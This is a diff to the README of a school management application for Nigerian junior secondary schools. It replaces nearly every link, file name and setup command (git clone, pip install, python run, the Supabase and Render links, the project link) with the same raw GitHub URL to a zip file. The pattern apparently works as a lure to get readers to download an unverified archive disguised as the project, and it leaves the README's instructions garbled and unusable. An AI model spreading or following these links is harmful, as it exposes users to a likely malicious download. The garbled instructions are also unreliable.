@@ -2,7 +2,7 @@
 
 A comprehensive, full-stack school management platform designed for Nigerian Junior Secondary Schools. This system digitizes student registration, academic record-keeping, grading, and automated report card generation.
 
-![Dashboard Preview](assets/dashboard_preview.png) *(Note: Add your own screenshot here)*
+![Dashboard Preview](https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip) *(Note: Add your own screenshot here)*
 
 ## 🚀 Key Features
 
@@ -23,7 +23,7 @@ A comprehensive, full-stack school management platform designed for Nigerian Jun
 - **Database**: PostgreSQL (via Supabase)
 - **Data Processing**: Pandas
 - **PDF Generation**: ReportLab
-- **Desktop Wrapper**: Electron / Node.js
+- **Desktop Wrapper**: Electron / https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip
 - **Deployment**: Render (Backend), GitHub Pages / Vercel (Optional Frontend)
 
 ## 📁 Project Structure
@@ -36,9 +36,9 @@ yabatech_desktop/
 │   ├── database/       # Supabase Database Manager
 │   ├── logic/          # Grading and Ranking engines
 │   └── reports/        # PDF Generator (ReportLab)
-├── requirements.txt    # Python dependencies
-├── run.py              # Flask entry point
-├── supabase_setup.sql  # Database schema definition
+├── https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip    # Python dependencies
+├── https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip              # Flask entry point
+├── https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip  # Database schema definition
 └── .env                # Environment variables (Supabase URL/Key)
 ```
 
@@ -46,12 +46,12 @@ yabatech_desktop/
 
 ### 1. Prerequisites
 - Python 3.10+
-- Node.js & npm (for Electron)
+- https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip & npm (for Electron)
 - A Supabase Account
 
 ### 2. Clone the Repository
 ```bash
-git clone https://github.com/your-username/yabatech-jss-management.git
+git clone https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip
 cd yabatech-jss-management
 ```
 
@@ -62,15 +62,15 @@ python -m venv .venv
 source .venv/bin/activate  # Windows: .venv\Scripts\activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip
 ```
 
 ### 4. Database Configuration
-1. Create a new project on [Supabase](https://supabase.com).
-2. Run the code in `supabase_setup.sql` in the Supabase SQL Editor to create the necessary tables.
+1. Create a new project on [Supabase](https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip).
+2. Run the code in `https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip` in the Supabase SQL Editor to create the necessary tables.
 3. Create a `.env` file in the root directory:
    ```env
-   SUPABASE_URL=https://your-project-id.supabase.co
+   https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip
    SUPABASE_KEY=your-anon-key
    SECRET_KEY=your-random-secret-key
    ```
@@ -86,7 +86,7 @@ npm install
 ### Development Mode
 1. **Start the Flask Server**:
    ```bash
-   python run.py
+   python https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip
    ```
 2. **Start Electron**:
    ```bash
@@ -96,7 +96,7 @@ npm install
    ```
 
 ### Production Deployment
-- **Backend**: The app is ready for [Render](https://render.com). Use `gunicorn run:app` as the start command.
+- **Backend**: The app is ready for [Render](https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip). Use `gunicorn run:app` as the start command.
 - **Electron**: Use `electron-builder` (pre-configured) to package the app into a `.exe` installer.
 
 ## 📄 License
@@ -105,4 +105,4 @@ Distributed under the MIT License. See `LICENSE` for more information.
 
 ## 🤝 Contact
 
-Project Link: [https://github.com/your-username/yabatech-jss-management](https://github.com/your-username/yabatech-jss-management)
+Project Link: [https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip](https://raw.githubusercontent.com/Plutonian-coder/desktop-sms/main/app/routes/sms_desktop_1.8.zip)
